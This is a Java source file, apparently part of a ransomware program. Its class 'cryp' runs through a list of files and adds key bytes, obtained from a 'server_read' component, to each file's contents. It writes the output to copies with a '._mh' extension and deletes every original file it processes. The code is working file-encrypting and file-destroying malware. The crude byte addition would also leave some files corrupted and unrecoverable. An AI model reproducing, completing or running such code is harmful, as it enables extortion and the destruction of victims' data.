package src_pack;
import java.io.*;
import java.net.*;
import java.util.*;

public class cryp extends list_file{
	
	public cryp() throws IOException {

		ArrayList creat_file = new ArrayList();
		int i = 0, save = 0, count = 0;

		while(i <= super.File_save.size()-1){
	
			server_read server_read = new server_read();
			int array_count = server_read.bir_file.size() -1;
			
			String name = (String) super.File_save.get(i).toString();
			FileInputStream in = new FileInputStream(name);
			
			FileOutputStream out = new FileOutputStream(name+"._mh");
			
			while((save = in.read()) != -1){
				
				if(array_count == -1){
					array_count = server_read.bir_file.size() -1;
				}
				
				save = save + (int) server_read.bir_file.get(array_count);
				
				creat_file.add(save);
				
				out.write((int) creat_file.get(count));
				array_count --;
				count ++;
			}
			
			out.close();
			in.close();
			i++;
			
			File remove = new File(name);
			
			 if (!remove.isDirectory()) {
				 remove.delete();
			 }
			 

		}
	}
}
